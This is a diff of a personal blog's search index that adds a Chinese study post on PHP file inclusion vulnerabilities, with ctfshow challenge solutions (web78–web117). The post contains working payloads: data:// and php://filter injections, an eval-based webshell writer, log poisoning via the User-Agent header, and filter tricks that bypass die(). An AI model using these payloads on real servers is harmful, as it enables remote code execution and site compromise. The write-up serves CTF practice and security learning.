@@ -647,6 +647,13 @@
       </tags>
   </entry>
   <entry>
+    <title>搞砸了</title>
+    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
+    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
+<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>web31-命令执行结束</title>
     <url>/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/</url>
     <content><![CDATA[<h1>Web31</h1>
@@ -1105,10 +1112,253 @@ preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变�
       </tags>
   </entry>
   <entry>
-    <title>搞砸了</title>
-    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
-    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
-<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
+    <title>文件包含</title>
+    <url>/2025/01/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<p>正式开始文件包含</p>
+<p>从csdn了解一下，以下都为简洁信息，可作为背诵记忆，具体理解请访问原作者</p>
+<h1><strong>文件包含知识点</strong></h1>
+<h2 id="一、什么是文件包含漏洞">一、什么是文件包含漏洞</h2>
+<p>文件包含漏洞是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p>
+<p>以PHP为例,常用的文件包含函数有以下四种<br>
+include(),require(),include_once(),require_once()</p>
+<p>区别如下:</p>
+<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>
+include():找不到被包含的文件只会产生警告，脚本继续执行<br>
+require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>
+include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
+<h2 id="二、本地文件包含漏洞-LFI">二、本地文件包含漏洞(LFI)</h2>
+<p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)</p>
+<p>includ()</p>
+<p>我们可以通过此函数读取本地的敏感信息</p>
+<p>括号当中可以放进去绝对路径，知识点这里举例的…/…/windows/system.ini</p>
+<h2 id="三、LFI漏洞利用技巧">三、LFI漏洞利用技巧</h2>
+<h3 id="1-配合文件上传使用">1.配合文件上传使用</h3>
+<p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
+<p>由于本人了解过这里上传图片的知识，这里不再多加赘述个人理解</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php eval($_POST[123]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段代码的目的是创建一个 PHP Web Shell 文件。它的执行流程如下：</p>
+<p>​	①**<code>fopen(&quot;shell.php&quot;, &quot;w&quot;)</code>**：</p>
+<ul>
+<li>该函数打开一个名为 <code>shell.php</code> 的文件进行写入。如果文件不存在，它会创建这个文件。</li>
+<li><code>&quot;w&quot;</code> 参数表示以写模式打开文件。如果文件已经存在，则会清空文件内容并重新写入。</li>
+</ul>
+<p>​	②**<code>fwrite()</code>**：</p>
+<ul>
+<li><code>fwrite()</code> 函数将 <code>&lt;?php eval($_POST[123]);?&gt;</code> 这个字符串写入到 <code>shell.php</code> 文件中。</li>
+<li><code>eval()</code> 是一个非常危险的 PHP 函数，它会执行其参数中的 PHP 代码。在这个例子中，<code>eval($_POST[123]);</code> 会执行通过 HTTP POST 请求中传入的名为 <code>123</code> 的参数所包含的 PHP 代码。</li>
+</ul>
+<p>找到路径之后可以用蚂剑连接或者url后面直接搞</p>
+<h3 id="2-包含Apache日志文件">2.包含Apache日志文件</h3>
+<p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
+<p>日志的目录一般会变怎样查看日志的目录？需要读取服务器配置文件(httpd.conf,ngix.conf…)或者根据phpinfo();得知(在phpinfo里搜error_log如果后面的值为空，则为默认地址。（<strong>对于Apache，日志存放路径：/var/log/apache/access.log<br>
+对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</strong> )</p>
+<p>怎样看是Apache或者Ngix？在响应头的sever里</p>
+<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log</p>
+<h3 id="3-包含SESSION文件">3.包含SESSION文件</h3>
+<p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<h3 id="4-包含临时文件">4.包含临时文件</h3>
+<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
+<h2 id="四、远程文件包含-RFI">四、远程文件包含(RFI)</h2>
+<p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
+<h2 id="五、PHP伪协议">五、PHP伪协议</h2>
+<p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数</p>
+<p>如表所示</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td>访问本地文件系统</td>
+</tr>
+<tr>
+<td>http://</td>
+<td>访问HTTP(s)网址</td>
+</tr>
+<tr>
+<td>ftp://</td>
+<td>访问FTP(s)URLs</td>
+</tr>
+<tr>
+<td>php://</td>
+<td>访问各个输出/输出流(I/O streams)</td>
+</tr>
+<tr>
+<td>zlib://</td>
+<td>压缩流</td>
+</tr>
+<tr>
+<td>data://</td>
+<td>数据(RFC 2397)</td>
+</tr>
+<tr>
+<td>glob://</td>
+<td>查找匹配的文件路径模式</td>
+</tr>
+</tbody>
+</table>
+<h3 id="1-file-协议">1.file://协议</h3>
+<p><strong>file://</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
+<p><strong>file:// [文件的绝对路径和文件名]</strong></p>
+<h3 id="2-php-协议">2.php://协议</h3>
+<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input<br>
+php://filter用于读取源码。<br>
+php://input用于执行php代码。</p>
+<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。<br>
+<strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
+<h3 id="3-ZIP-协议">3.ZIP://协议</h3>
+<p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
+<h3 id="4-data-协议">4.data://协议</h3>
+<p>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="5-伪协议利用条件">5.伪协议利用条件</h3>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>测试 PHP 版本</th>
+<th>allow_url_fopen</th>
+<th style="text-align:center">allow_url_include</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td style="text-align:center">off/on</td>
+<td>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td style="text-align:center">off/on</td>
+<td>?file=php://filter/read=convert.base64 - encode/resource=./index.php</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td>&gt;=5.2</td>
+<td>on</td>
+<td style="text-align:center">on</td>
+<td>?file=php://input 【POST DATA】</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td style="text-align:center">off/on</td>
+<td>?file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.txt</td>
+</tr>
+<tr>
+<td>compress.bzip2://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td style="text-align:center">off/on</td>
+<td>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.bz2 【or】 ?file=compress.bzip2://./file.bz2</td>
+</tr>
+<tr>
+<td>compress.zlib://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td style="text-align:center">off/on</td>
+<td>?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz 【or】 ?file=compress.zlib://./file.gz</td>
+</tr>
+</tbody>
+</table>
+<h2 id="六、文件包含漏洞防护">六、文件包含漏洞防护</h2>
+<p>1、使用str_replace等方法过滤掉危险字符</p>
+<p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p>
+<p>3、php版本升级，防止%00截断</p>
+<p>4、对上传的文件进行重命名，防止被读取</p>
+<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
+<p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化<br>
+————————————————</p>
+<pre><code>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>
+<p>举一反三：</p>
+<p><img src="image-20250122172011834.png" alt="image-20250122172011834"></p>
+<p>通过这个知识点的介绍我们联想一下：在之前我们做题时，我们传进去</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+<p>可能无法查看phpinfo()，那我们用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php phpinfo(); ?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>是不是可以拿到phpinfo()？（web78可以）</p>
+<h1>web78</h1>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中有一个include包含，那我们是不是可以</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;); ?&gt;</span></span><br><span class="line">    </span><br><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<p>ctfshow{950b168a-e2de-4fbb-9daa-11260a8af088}</p>
+<h1>web79</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>源码把我们的php给替换成三个问号，那我们用base64加密一下就可以了</p>
+<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</p>
+<p>ctfshow{2751c0eb-edde-4e4f-a845-64cca68c1863}</p>
+<h1>web80</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>对于Apache，日志存放路径：/var/log/apache/access.log<br>
+对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</strong></p>
+<p>响应头里面可以看是Aoache还是Ngnix</p>
+<p><img src="image-20250122195554595.png" alt="image-20250122195554595"></p>
+<p>但有时候日志目录会改变，需要找</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">User-Agent=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;fl0g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">方法二（这个不行，因为过滤了php）</span><br><span class="line">php:<span class="comment">//input可以把POST的内容作为php代码执行</span></span><br><span class="line"></span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;fl0g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>都可以用蚂剑连接post，但是需要知道日志的目录，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ec78819f-174d-4e26-82be-7cce55c08b05.challenge.ctf.show/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p>ctfshow{8d557bc7-1379-4a37-b5c1-2497fcef48e2}</p>
+<h1>web81</h1>
+<p>还是日志</p>
+<p>ctfshow{11544a11-2a2e-4667-8a84-15b260e4d33c}</p>
+<h1>web82-86</h1>
+<p><strong>竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件</strong></p>
+<p>那现在不做了</p>
+<h1>web87</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们正常看到的url是url编码过的，在hackbar里面如果有空格的话，它自己会把空格转成%20再上传，在服务器里面他又会自己解码成空格。</p>
+<p>在源码当中有一个urldecode($file)，他会把我们是$file进行一次url解码一次。根据上一段，我们推断：我们的?file=后面的东西需要进行两次url加密(all)。</p>
+<p>源码当中有<?php die('大佬别秀了');?>，他会终止代码运行，导致我们post的conten无法运行，那么我们可以</p>
+<p>使用filter，然后进行base64解码。因为我们知道：base64里面是大小写字母加数字外还有+和/，没有其他的符号了，总共64个。那么我们把file_put_contents后面的&quot;<?php die('大佬别秀了');?>&quot;.$content写进一个1.php文件里面，并对1.php使用php://filter/write协议的base64加密。那么die()函数就失效了。因为经过base64之后，其内容变成了phpdie，那么我们把post的content的内容改为经过base64加密的<?php eval($_POST[a]); ?>就可以在1.php里面写入一个一句话木马。然后通过一句话木马拿到flag</p>
+<p>由于base64的编码必须为4的倍数，所以，我们在<?php eval($_POST[a]); ?>前面随便加两个base64里面有的字符就可以了，以便和前面我们破坏城的phpdie凑成8个。</p>
+<p>过程：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line"></span><br><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line"></span><br><span class="line">content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line"></span><br><span class="line">content=aaPD9waHAgZXZhbCgkX1BPU1RbYV0pOyA/Pg==</span><br><span class="line"></span><br><span class="line">之后</span><br><span class="line"></span><br><span class="line">url/<span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>ctfshow{ec5c4e6c-2b7a-48b2-b297-47b9597f2635}</p>
+<p>另一种方法：php://filter/write=string.rot13/resource=1.php</p>
+<p>rot13：将字母按照字母表的顺序递进13次</p>
+<p>通过位移将原来的 <?php die('大佬别秀了');?> 变成 <?cuc qvr('大佬别秀了');?></p>
+<p>?file=php://filter/write=string.rot13/resource=1.php</p>
+<p>?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</p>
+<p>content=<?php system('cat f*');?></p>
+<p>content=<?cuc flfgrz('gnp s*.cuc');?></p>
+<h1>web88</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>?file=data://text/plain;base64,&lt;?php system(‘tac fl*’);</p>
+<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7</p>
+<p>ctfshow{1831aaaa-8728-4d78-92a7-bd81f724b308}</p>
+<h1>web116</h1>
+<p>misc和web结合的题目</p>
+<p>下载视频foremost分离</p>
+<p>?file=flag.php</p>
+<p>bp抓包</p>
+<p>ctfshow{0a660000-a7ba-4b5e-b76c-d299aad214a0}</p>
+<h1>web117</h1>
+<p>UCS-2编码转换:对目标字符串进行2位一反转</p>
+<p>?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</p>
+<p>contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</p>
+<p>ctfshow{3b47fcc8-c7cd-453d-b807-fb93b3395516}</p>
+<p>还有UCS-4</p>
+<h1>凌晨4点，玩会儿手机睡觉了，web82-86竞争环境，明天凌晨再搞了</h1>
 ]]></content>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
   </entry>
 </search>
